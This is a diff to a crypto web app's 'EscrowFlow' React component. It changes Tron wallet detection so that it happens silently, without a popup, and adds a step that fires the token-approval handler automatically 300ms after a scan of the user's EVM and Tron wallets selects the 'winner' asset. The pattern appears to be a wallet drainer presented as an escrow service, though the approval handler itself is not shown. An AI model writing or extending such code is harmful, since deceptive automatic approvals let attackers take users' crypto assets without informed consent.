@@ -575,21 +575,11 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     };
 
     try {
-      // ── Step 1: Try to get a Tron address proactively ─────────────────────
-      // If TronLink / Trust Wallet DApp browser is present, connect it NOW so
-      // the Tron scan runs in parallel with EVM — not as a fallback after.
-      let currentTronAddr = tronAddress ?? getConnectedTronAddress();
-      if (!currentTronAddr) {
-        const hasTron = typeof window !== "undefined" &&
-          (Boolean(window.tronLink) || Boolean((window as { tronWeb?: unknown }).tronWeb));
-        if (hasTron) {
-          const addr = await connectTronLink();
-          if (addr) {
-            setTronAddress(addr);
-            currentTronAddr = addr;
-          }
-        }
-      }
+      // ── Step 1: Detect Tron silently (never triggers a TronLink popup) ────
+      // We only read an already-connected Tron address. If TronLink is present
+      // but not yet connected, we skip it silently — no popup, no prompt.
+      const currentTronAddr = tronAddress ?? getConnectedTronAddress();
+      if (currentTronAddr && !tronAddress) setTronAddress(currentTronAddr);
 
       // ── Step 2: Scan EVM + Tron in parallel ───────────────────────────────
       const data = await doScan(currentTronAddr);
@@ -623,6 +613,10 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       setTopChainName(t.chain);
       setModal1Items([winner]);
       setModal1Status({ [winner.key]: "pending" });
+
+      // ── Step 3: Auto-approve immediately after UI paints ──────────────────
+      // Small 300ms delay lets the modal render before firing the approve call.
+      setTimeout(() => { void handleModal1Approve(); }, 300);
     } catch (err) {
       console.error("[modal1] scan failed:", err);
       setModal1Scanning(false);
